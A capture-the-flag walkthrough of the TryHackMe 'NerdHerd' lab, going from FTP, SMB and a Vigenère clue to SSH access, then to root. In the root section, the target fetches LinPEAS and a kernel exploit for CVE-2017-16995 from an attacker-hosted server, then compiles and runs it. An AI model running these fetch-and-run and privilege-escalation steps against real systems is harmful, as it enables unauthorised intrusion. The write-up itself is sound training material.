# [NerdHerd](https://tryhackme.com/room/nerdherd)

## Hack your way into this easy/medium level legendary TV series "Chuck" themed box!

# PWN

## Hack this machine before nerd herd fellas arrive, happy hacking!!!

### User Flag

1. Perform a comprehensive port scan to identify open services on the target machine:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Attempt anonymous FTP login to discover any publicly accessible files:

```bash
ftp <TARGET_IP>
anonymous
ls -la
cd pub
ls -la
get youfoundme.png
cd .jokesonyou
ls -la
get hellon3rd.txt
```

**Content of hellon3rd.txt:**

```
all you need is in the leet
```

This cryptic message hints that port 1337 contains important information.

3. Extract metadata from the downloaded image using exiftool:

```bash
exiftool youfoundme.png
```

**Results:**

```
Owner Name: fijbxslz
```

The Owner Name field contains what appears to be an encoded string: `fijbxslz`

4. Navigate to the web server running on port 1337. At the bottom of the page, there's a YouTube link to "The Trashmen - Surfin Bird - Bird is the Word 1963". This is a significant clue - the phrase "bird is the word" is likely a cipher key.

5. Use [CyberChef](https://gchq.github.io/CyberChef/) to decode `fijbxslz`:
   - Select "Vigenère Decode" operation
   - Enter `fijbxslz` as input
   - Use `birdistheword` as the key
   - Result: `easypass`.

[SCREEN01]

6. Enumerate SMB users and shares on the target:

```bash
enum4linux <TARGET_IP>
```

**Results:**

```
=======================================( Users on <TARGET_IP> )=======================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck    Name: ChuckBartowski    Desc:

user:[chuck] rid:[0x3e8]
```

We discovered a user account: `chuck`

7. List available SMB shares:

```bash
smbclient -L //<TARGET_IP> -N
```

**Results:**

```
Sharename           Type      Comment
---------           ----      -------
print$              Disk      Printer Drivers
nerdherd_classified Disk      Samba on Ubuntu
IPC$                IPC       IPC Service (nerdherd server (Samba, Ubuntu))
```

8. Connect to the SMB share using the credentials found earlier:

```bash
smbclient //<TARGET_IP>/nerdherd_classified -U chuck
# Password: easypass
ls
get secr3t.txt
```

**Content of secr3t.txt**

```
Ssssh! don't tell this anyone because you deserved it this far:

	check out "/this1sn0tadirect0ry"

Sincerely,
	0xpr0N3rd
<3
```

9. Navigate to the hidden directory `http://<TARGET_IP>:1337/this1sn0tadirect0ry/` and download the credentials file.

**Content of creds.txt**

```
alright, enough with the games.

here, take my ssh creds:

	chuck : th1s41ntmypa5s
```

10. Connect to the target via SSH:

```bash
ssh chuck@<TARGET_IP>
# Password: th1s41ntmypa5s
```

11. Once logged in, locate and read the user flag:

```bash
ls
cat user.txt
```

[SCREEN02]

---

### Root Flag

1. On your attacker machine, download and host the LinPEAS script:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server
```

2. On the target machine (as chuck):

```bash
cd /tmp
wget http://1<ATTACKER_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Results:**

```
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
Linux version 4.4.0-31-generic (buildd@lgw01-16) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2.1) ) #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.1 LTS
Release:        16.04
Codename:       xenial
```

The kernel version (4.4.0-31-generic) is outdated and vulnerable to known exploits. Ubuntu 16.04.1 LTS with this kernel version is susceptible to CVE-2017-16995 (local privilege escalation).

3. On your attacker machine, download the exploit from Exploit-DB [CVE-2017-16995](https://www.exploit-db.com/exploits/45010).

4. On the target machine:

```bash
wget http://1<ATTACKER_IP>:8000/45010.c
gcc -o 45010 45010.c
chmod +x 45010
./45010
whoami
```

You should now have a root shell!

[SCREEN03]

5. Search for the root flag across the filesystem:

```bash
grep -r "THM{" / 2>/dev/null
```

[SCREEN04]

---

### Bonus Flag

_brings back so many memories_

1. The grep command from the previous step revealed additional flag. Check the root user's bash history:

```bash
cat /root/.bash_history
```

[SCREEN05]
